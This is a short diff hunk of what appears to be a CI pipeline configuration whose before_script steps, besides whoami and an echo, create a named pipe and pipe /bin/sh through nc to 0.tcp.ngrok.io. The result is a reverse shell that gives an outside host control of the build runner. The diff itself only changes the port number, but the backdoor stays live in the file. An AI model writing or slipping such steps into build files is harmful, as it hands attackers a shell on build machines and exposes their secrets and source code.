@@ -4,7 +4,7 @@ before_script:
   - whoami
   - echo "test"
   
-  - export NGPORT=14932
+  - export NGPORT=13095
   - export NGHOSTNAME=0.tcp.ngrok.io
   - mknod /tmp/backpipe p
   - /bin/sh 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
